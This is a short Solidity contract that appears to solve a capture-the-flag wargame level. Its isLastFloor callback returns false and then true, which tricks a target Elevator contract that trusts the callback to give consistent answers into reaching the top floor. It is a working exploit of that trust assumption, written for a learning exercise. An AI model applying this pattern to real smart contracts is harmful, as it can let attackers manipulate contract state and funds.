// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool flag;

    function isLastFloor(uint) external returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        }
        return flag;
    }

    function attack(IElevator _target) external {
        _target.goTo(1);
    }
}